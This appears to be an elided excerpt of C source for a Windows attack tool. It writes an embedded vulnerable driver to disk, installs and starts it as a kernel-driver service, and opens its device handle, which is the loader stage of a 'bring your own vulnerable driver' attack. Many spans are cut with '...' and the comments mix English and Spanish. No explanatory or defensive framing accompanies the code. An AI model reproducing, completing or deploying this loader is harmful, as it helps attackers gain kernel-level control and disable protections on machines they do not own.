...
// Generate the full driver path by retrieving the Windows Directory and appending the configured driver path and filename
BOOL GenerateDriverFullPath(IN const LPCWSTR pszDriverName, IN size_t cchDriverPath, OUT WCHAR* pszDriverPath) {

    BOOL bSTATE = TRUE;

    // Check if something is NULL
    if (pszDriverName == NULL || pszDriverPath == NULL || cchDriverPath == 0) {
...
// Writes the driver to specified file path generated with GenerateDriverFullPath()
BOOL WriteDriverToFile(IN const LPCWSTR pszDriverName, IN PBYTE pbDriver, IN DWORD dwDriverSize, OUT LPWSTR* pszFullDriverPath) {
    BOOL bSTATE = TRUE;

    // Check if something is NULL
    if (pszDriverName == NULL || pbDriver == NULL || dwDriverSize == 0) {
        error("LoadDriver - Something is null");
        bSTATE = FALSE;
        goto _cleanUp;
    }
    ...
    infoW_t("Generated driver directory \"%ls\"", szDriverPath);

    // Write driver to the file
    if (!WriteFileW(szDriverPath, pbDriver, dwDriverSize)) {
        error("WriteFileW - Failed to write driver");
        bSTATE = FALSE;
        goto _cleanUp;
    }
    infoW_t("WriteFileW - Written driver to \"%ls\"", szDriverPath);
...
_cleanUp:
    ...
    if (bSTATE == FALSE && szVulnDriverPath != NULL) {
        free(szVulnDriverPath);
        szVulnDriverPath = NULL;
    }

    return bSTATE;
}
// Loads driver as an servcice
BOOL LoadDriver(IN const LPCWSTR lpwcDriverName, IN LPCWSTR lpwcDriverPath) {
    ...
    hScm = OpenSCManagerW(
        ...
        SERVICES_ACTIVE_DATABASEW,  // Default value
        SC_MANAGER_ALL_ACCESS   // Access rights to create service
    );
    if (hScm == NULL) {
    ...
    hService = CreateServiceW(
        ...
        (LPCWSTR)g_VULNDRIVERNAME,   // Service name
        (LPCWSTR)g_VULNDRIVERNAME,   // Display name
        SERVICE_ALL_ACCESS,     // Permissions to start the service
        SERVICE_KERNEL_DRIVER,  // Service type
        SERVICE_DEMAND_START,   // Start type
        SERVICE_ERROR_IGNORE,   // Ignore startup errors
    ...
    if (hService == NULL) {
        ...
        if (GetLastError() == ERROR_SERVICE_EXISTS) {
            ...
            hService = OpenServiceW(
                hScm,               // Handle al SCM
                (LPCWSTR)g_VULNDRIVERNAME,         // Nombre del servicio (wide string)
                SERVICE_ALL_ACCESS | SERVICE_STOP | DELETE
...
// Unloads the driver and deletes the service
BOOL UnloadDriver(IN const LPCWSTR lpwcDriverName) {
    ...
    hService = OpenServiceW(
        hScm,                   // Handle to the SCM manager
        (LPCWSTR)g_VULNDRIVERNAME,       // mismo nombre que en CreateServiceW
...
HANDLE GetDeviceHandle(IN const LPCWSTR lpwcDriverSymlink) {
    ...
    hDevice = CreateFileW(
        g_VULNDRIVERSYMLINK,			// Symbolic link to driver
